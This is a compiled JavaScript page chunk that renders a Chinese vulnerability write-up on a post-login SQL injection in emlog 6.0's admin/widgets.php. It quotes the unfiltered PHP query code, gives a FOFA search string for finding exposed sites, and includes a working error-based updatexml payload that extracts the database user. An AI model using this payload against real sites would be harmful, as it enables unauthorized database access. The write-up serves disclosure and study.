(window.webpackJsonp=window.webpackJsonp||[]).push([[41],{1003:function(t,s,a){t.exports=a.p+"assets/img/1634002177714-22159b01-c44f-476a-bb4f-8363cceb9460.60d83010.png"},1004:function(t,s,a){t.exports=a.p+"assets/img/1634002231213-67b50259-52f0-4cf0-983b-fc1a88cc6471.53881fb3.png"},1005:function(t,s,a){t.exports=a.p+"assets/img/1634002837216-c1000372-81ea-4671-bc5d-c378110d93db.bef4ea0a.png"},1006:function(t,s,a){t.exports=a.p+"assets/img/1634002917512-820b18c8-d37a-4507-974c-1ba9c2afc2ed.c3fccf84.png"},1007:function(t,s,a){t.exports=a.p+"assets/img/1634003089227-452c8b4e-d367-4f01-af1f-e90a79bfd91f.7738accc.png"},2121:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"emlog-widgets-php-后台sql注入漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#emlog-widgets-php-后台sql注入漏洞"}},[t._v("#")]),t._v(" emlog widgets.php 后台SQL注入漏洞")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("emlog widgets.php文件在登录后通过构造特殊语句导致SQL注入，获取数据库敏感信息")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("emlog 6.0 ")]),n("br"),t._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v('app="EMLOG"')]),n("br"),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("产品主页")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[t._v("https"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v("github"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("emlog"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("emlog\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1003),alt:"img"}})]),t._v(" "),n("p",[t._v("存在漏洞的文件为 "),n("strong",[t._v("admin/widgets.php")])]),t._v(" "),n("p",[n("img",{attrs:{src:a(1004),alt:"img"}})]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$action "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'compages'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    $wgNum "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" isset"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$_POST"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'wgnum'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" ? intval"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$_POST"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'wgnum'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v("侧边栏编号 "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("、"),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("、"),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),t._v(" ……\n    $widgets "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" isset"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$_POST"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'widgets'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" ? serialize"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$_POST"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'widgets'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    Option"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("updateOption"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"widgets{$wgNum}"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" $widgets"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    $CACHE"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("updateCache"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'options'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    emDirect"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"./widgets.php?activated=true&wg=$wgNum"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br")])]),n("p",[t._v("传参为 wgnum 和 widgets ，跟踪方法 "),n("strong",[t._v("updateOption")])]),t._v(" "),n("p",[n("img",{attrs:{src:a(1005),alt:"img"}})]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[t._v("static function updateOption"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("$name"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" $value"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" $isSyntax "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" false"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        $DB "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Database"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("getInstance"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        $value "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" $isSyntax ? $value "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"'$value'\"")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        $DB"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("query"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'UPDATE '")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("DB_PREFIX"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"options SET option_value=$value where option_name='$name'\"")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br")])]),n("p",[t._v("可以发现对传入的参数木有进行过滤，构造Payload")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[t._v("POST "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("admin"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("widgets"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("php?action"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("compages\n\nwidgets"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("' "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("and")]),t._v(" updatexml"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x3a")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("concat"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select user"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" \n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br")])]),n("p",[t._v("调试后可以发现，数据库报错语句会回显至页面中，报错注入即可获取敏感信息")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1006),alt:"img"}}),n("img",{attrs:{src:a(1007),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);